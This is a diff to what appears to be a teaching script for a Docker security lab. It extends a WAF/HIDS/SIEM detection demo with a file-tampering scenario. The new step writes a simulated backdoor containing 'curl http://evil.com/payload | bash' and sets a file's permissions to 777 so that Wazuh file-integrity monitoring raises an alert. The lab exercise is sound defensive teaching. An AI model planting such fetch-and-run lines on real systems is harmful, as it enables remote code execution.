@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 # SPDX-License-Identifier: MIT
 # Lesson 06 Attack Script — 完整安全链路端到端演示
-# 依次执行两种攻击场景，观察全链路检测效果。
+# 依次执行三种攻击场景，观察全链路检测效果。
 
 set -euo pipefail
 
@@ -69,9 +69,84 @@ XSS_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
 echo "  结果: HTTP $XSS_CODE"
 echo ""
 
-# Step 2: 暴力破解
+# Step 2: 文件篡改攻击（FIM 检测）
 echo "============================================"
-echo "  [攻击 2] 暴力破解 — Wazuh SIEM 关联检测"
+echo "  [攻击 2] 文件篡改 — HIDS (FIM) 检测"
+echo "============================================"
+echo ""
+
+echo "  2a) 等待 FIM 基线扫描完成..."
+echo "  （首次扫描需要建立文件基线，此时不会产生告警）"
+BASELINE_REACHED=false
+for i in $(seq 1 120); do
+  SCAN_END=$(docker compose logs wazuh-agent 2>/dev/null | grep -c "scan ended" || true)
+  if [ "$SCAN_END" -gt 0 ]; then
+    BASELINE_REACHED=true
+    break
+  fi
+  sleep 1
+done
+if [ "$BASELINE_REACHED" = true ]; then
+  echo "  ✓ 基线扫描已完成，后续文件变化将触发告警"
+else
+  echo "  ⚠ 超时，继续执行（基线可能仍在建立中）"
+fi
+echo ""
+
+echo "  2b) 清理历史攻击痕迹..."
+docker exec wazuh-agent sh -c 'rm -rf /monitored/juice-shop/tmp/.hidden 2>/dev/null' || true
+docker exec wazuh-agent sh -c 'chmod 644 /monitored/juice-shop/package.json 2>/dev/null' || true
+echo "  ✓ 已清理"
+echo ""
+
+echo "  2c) 等待 FIM 重新建立干净基线..."
+SCAN_COUNT_BEFORE=$(docker compose logs wazuh-agent 2>/dev/null | grep -c "scan ended" || true)
+for i in $(seq 1 40); do
+  SCAN_COUNT_NOW=$(docker compose logs wazuh-agent 2>/dev/null | grep -c "scan ended" || true)
+  if [ "$SCAN_COUNT_NOW" -gt "$SCAN_COUNT_BEFORE" ]; then
+    echo "  ✓ 干净基线已建立（第 $((SCAN_COUNT_NOW - SCAN_COUNT_BEFORE)) 次新扫描）"
+    break
+  fi
+  if [ "$i" -eq 40 ]; then
+    echo "  ⚠ 等待超时，继续执行"
+  fi
+  sleep 1
+done
+echo ""
+
+echo "  2d) 创建可疑文件（模拟后门）..."
+docker exec wazuh-agent sh -c 'mkdir -p /monitored/juice-shop/tmp/.hidden' 2>/dev/null || true
+docker exec wazuh-agent sh -c 'echo "#!/bin/bash" > /monitored/juice-shop/tmp/.hidden/backdoor.sh' 2>/dev/null || true
+docker exec wazuh-agent sh -c 'echo "# Reverse shell simulation" >> /monitored/juice-shop/tmp/.hidden/backdoor.sh' 2>/dev/null || true
+docker exec wazuh-agent sh -c 'echo "curl http://evil.com/payload | bash" >> /monitored/juice-shop/tmp/.hidden/backdoor.sh' 2>/dev/null || true
+docker exec wazuh-agent sh -c 'chmod +x /monitored/juice-shop/tmp/.hidden/backdoor.sh' 2>/dev/null || true
+echo "  ✓ 可疑文件已创建: /monitored/juice-shop/tmp/.hidden/backdoor.sh"
+echo ""
+
+echo "  2e) 修改文件权限（触发属性变化告警）..."
+docker exec wazuh-agent sh -c 'chmod 777 /monitored/juice-shop/package.json' 2>/dev/null || true
+echo "  ✓ 文件权限已修改: package.json → 777"
+echo ""
+
+echo "  2f) 等待 FIM 检测变化..."
+echo "  （等待下一次定期扫描，约 30 秒）"
+SCAN_COUNT_BEFORE=$(docker compose logs wazuh-agent 2>/dev/null | grep -c "scan ended" || true)
+for i in $(seq 1 40); do
+  SCAN_COUNT_NOW=$(docker compose logs wazuh-agent 2>/dev/null | grep -c "scan ended" || true)
+  if [ "$SCAN_COUNT_NOW" -gt "$SCAN_COUNT_BEFORE" ]; then
+    echo "  ✓ FIM 扫描已完成，变化已上报 Manager"
+    break
+  fi
+  if [ "$i" -eq 40 ]; then
+    echo "  ⚠ 等待扫描超时"
+  fi
+  sleep 1
+done
+echo ""
+
+# Step 3: 暴力破解
+echo "============================================"
+echo "  [攻击 3] 暴力破解 — Wazuh SIEM 关联检测"
 echo "============================================"
 echo ""
 
@@ -95,7 +170,7 @@ done
 echo "  攻击完成: 总 50 次, 失败 $FAILED 次"
 echo ""
 
-# Step 3: 等待 SIEM 关联分析
+# Step 4: 等待 SIEM 关联分析
 echo "============================================"
 echo "  [等待] SIEM 关联分析中..."
 echo "============================================"
@@ -105,7 +180,7 @@ sleep 30
 echo "  ✓ 等待完成"
 echo ""
 
-# Step 4: 查看告警
+# Step 5: 查看告警
 echo "============================================"
 echo "  [告警] 查看检测到的安全事件"
 echo "============================================"
@@ -115,12 +190,15 @@ echo "  WAF (ModSecurity) 日志:"
 docker compose logs --tail=5 nginx-modsecurity 2>/dev/null | grep -i "denied\|blocked\|attack\|alert" | tail -3 || echo "  (无匹配)"
 echo ""
 
-echo "  Wazuh Manager 告警:"
-docker compose exec wazuh-manager cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | \
-  grep -i "brute\|login\|auth" | head -3 || echo "  (无匹配)"
+echo "  HIDS (FIM) 告警:"
+docker compose exec wazuh-manager sh -c "grep 'syscheck' /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -3" || echo "  (无 FIM 告警)"
 echo ""
 
-# Step 5: Dashboard 指引
+echo "  Wazuh Manager 暴力破解告警:"
+docker compose exec wazuh-manager sh -c "grep -i 'brute\|login.*fail\|auth' /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -3" || echo "  (无匹配)"
+echo ""
+
+# Step 6: Dashboard 指引
 echo "============================================"
 echo "  [Dashboard] 安全态势可视化"
 echo "============================================"
@@ -131,9 +209,10 @@ echo "    账号: admin / admin"
 echo ""
 echo "  在 Dashboard 中查看:"
 echo "    1. Security Events — 查看所有安全事件"
-echo "    2. 按严重级别筛选 (Critical/High/Medium/Low)"
-echo "    3. 按来源筛选 (WAF/HIDS)"
-echo "    4. 查看攻击来源 IP"
+echo "    2. FIM 告警: rule.groups: syscheck"
+echo "    3. WAF 告警: rule.groups: waf"
+echo "    4. 暴力破解: rule.groups: authentication"
+echo "    5. 按严重级别筛选 (Critical/High/Medium/Low)"
 echo ""
 
 echo "╔══════════════════════════════════════════════════════════╗"
@@ -141,7 +220,8 @@ echo "║  完整安全链路演示完成                                    ║
 echo "║                                                        ║"
 echo "║  检测链路: 攻击 → WAF → HIDS → SIEM → Dashboard ║"
 echo "║                                                        ║"
-echo "║  本次演示的两种攻击场景:                                 ║"
+echo "║  本次演示的三种攻击场景:                                 ║"
 echo "║    1. SQL 注入  → WAF (ModSecurity) 拦截                ║"
-echo "║    2. 暴力破解  → SIEM (Wazuh) 关联告警                 ║"
+echo "║    2. 文件篡改  → HIDS (FIM) 检测                       ║"
+echo "║    3. 暴力破解  → SIEM (Wazuh) 关联告警                 ║"
 echo "╚══════════════════════════════════════════════════════════╝"
